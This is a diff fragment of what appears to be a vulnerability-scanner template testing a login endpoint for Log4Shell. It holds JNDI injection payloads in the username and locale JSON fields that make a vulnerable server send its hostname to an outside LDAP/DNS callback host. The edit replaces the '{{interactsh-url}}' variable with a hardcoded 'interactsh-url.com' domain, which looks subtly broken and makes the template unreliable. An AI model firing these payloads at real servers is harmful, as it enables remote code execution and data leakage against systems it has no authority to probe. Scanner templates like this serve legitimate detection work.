@@ -35,7 +35,7 @@ http:
         Referer: {{RootURL}}/fpc/app/login
         Content-Type: application/json
 
-        {"username":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}","password":"{{str}}","isAdmin":false,"locale":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}"}
+        {"username":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.interactsh-url.com/{{str}}}","password":"{{str}}","isAdmin":false,"locale":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.interactsh-url.com/{{str}}}"}
 
     matchers-condition: and
     matchers:
